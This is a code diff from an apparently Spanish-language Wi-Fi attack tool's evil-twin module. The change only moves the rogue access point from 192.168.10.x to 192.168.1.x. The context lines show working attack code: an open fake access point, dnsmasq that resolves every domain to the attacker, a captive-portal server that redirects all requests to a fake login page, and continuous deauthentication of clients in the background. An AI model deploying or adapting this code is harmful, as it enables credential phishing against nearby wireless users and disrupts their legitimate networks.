@@ -1380,7 +1380,7 @@ def _evil_twin_monitor(essid: str, bssid: str, channel: str,
         def do_GET(self):
             if self.path != "/":
                 self.send_response(302)
-                self.send_header("Location", "http://192.168.10.1/")
+                self.send_header("Location", "http://192.168.1.1/")
                 self.end_headers(); return
             with open(_ppath, "rb") as _f: body = _f.read()
             self.send_response(200)
@@ -1417,14 +1417,14 @@ text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:360px;width:90%
 
     # Configurar at0
     run("ip addr flush dev at0 2>/dev/null", capture=True)
-    run("ip addr add 192.168.10.1/24 dev at0 2>/dev/null", capture=True)
+    run("ip addr add 192.168.1.1/24 dev at0 2>/dev/null", capture=True)
     run("ip link set at0 up 2>/dev/null", capture=True)
 
     # dnsmasq en at0
     with open("/tmp/herradura_twin/dnsmasq_at0.conf", "w") as _f:
-        _f.write("interface=at0\ndhcp-range=192.168.10.10,192.168.10.100,"
-                 "255.255.255.0,10m\ndhcp-option=3,192.168.10.1\n"
-                 "dhcp-option=6,192.168.10.1\naddress=/#/192.168.10.1\nno-resolv\n")
+        _f.write("interface=at0\ndhcp-range=192.168.1.10,192.168.1.100,"
+                 "255.255.255.0,10m\ndhcp-option=3,192.168.1.1\n"
+                 "dhcp-option=6,192.168.1.1\naddress=/#/192.168.1.1\nno-resolv\n")
     dm_proc = subprocess.Popen(
         ["dnsmasq", "-C", "/tmp/herradura_twin/dnsmasq_at0.conf", "--no-daemon"],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
@@ -1433,11 +1433,11 @@ text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:360px;width:90%
 
     # HTTP servidor portal
     try:
-        httpd = HTTPServer(("192.168.10.1", 80), _H)
+        httpd = HTTPServer(("192.168.1.1", 80), _H)
     except OSError:
         run("fuser -k 80/tcp 2>/dev/null", capture=True)
         time.sleep(1)
-        httpd = HTTPServer(("192.168.10.1", 80), _H)
+        httpd = HTTPServer(("192.168.1.1", 80), _H)
     _thr.Thread(target=httpd.serve_forever, daemon=True).start()
 
     # Deauth continuo en background
@@ -1709,10 +1709,10 @@ wpa=0
 
     # ── dnsmasq.conf ─────────────────────────────────────────────────────────
     dnsmasq_conf = """interface={iface}
-dhcp-range=192.168.10.10,192.168.10.100,255.255.255.0,10m
-dhcp-option=3,192.168.10.1
-dhcp-option=6,192.168.10.1
-address=/#/192.168.10.1
+dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,10m
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+address=/#/192.168.1.1
 no-resolv
 log-dhcp
 """.format(iface=iface_ap)
@@ -1746,7 +1746,7 @@ log-dhcp
             # Redirect any URL to portal
             if self.path != "/":
                 self.send_response(302)
-                self.send_header("Location", "http://192.168.10.1/")
+                self.send_header("Location", "http://192.168.1.1/")
                 self.end_headers()
                 return
             with open(_portal_path, "rb") as f:
@@ -1785,14 +1785,14 @@ h2{color:#2e7d32;margin-bottom:8px}p{color:#666;font-size:14px}</style>
 <script>setTimeout(()=>location.href='http://google.com',3500)</script>
 </div></body></html>""".encode("utf-8"))
 
-    httpd = HTTPServer(("192.168.10.1", 80), _Handler)
+    httpd = HTTPServer(("192.168.1.1", 80), _Handler)
     srv_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
 
     # ── Preparar interfaz ─────────────────────────────────────────────────────
     run("pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null", capture=True)
     time.sleep(1)
     run(f"ip addr flush dev {iface_ap} 2>/dev/null", capture=True)
-    run(f"ip addr add 192.168.10.1/24 dev {iface_ap} 2>/dev/null", capture=True)
+    run(f"ip addr add 192.168.1.1/24 dev {iface_ap} 2>/dev/null", capture=True)
     run(f"ip link set {iface_ap} up 2>/dev/null", capture=True)
 
     # ── Levantar servicios ────────────────────────────────────────────────────
